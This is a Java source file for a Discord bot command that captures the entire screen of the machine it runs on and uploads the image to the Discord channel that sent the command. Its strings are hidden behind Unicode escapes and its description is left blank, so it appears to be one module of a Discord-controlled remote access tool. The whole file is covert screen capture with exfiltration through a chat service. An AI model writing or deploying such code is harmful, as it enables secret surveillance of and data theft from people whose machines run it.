package cmd;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;

public class Screenshot extends Command{
    public Screenshot(){
        this.name = "\u0073\u0073";
        this.usage = "\u002f\u0073\u0073";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        try {
            BufferedImage capture = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            File imageFile = File.createTempFile("\u0063\u0032\u0039\u0077\u0061\u0047\u006c\u007a\u0064\u0047\u006c\u006a\u0059\u0058\u0052\u006c\u005a\u0043\u0045\u0068","\u002e\u0070\u006e\u0067");
            ImageIO.write(capture, "\u0070\u006e\u0067", imageFile );
            message.getChannel().sendMessage("\u0073\u0063\u0072\u0065\u0065\u006e\u0073\u0068\u006f\u0074").addFile(imageFile).queue();
            if (!imageFile.delete()) imageFile.deleteOnExit();
        }catch (Exception ee){ee.printStackTrace(); return  false;}

        return true;
    }
}
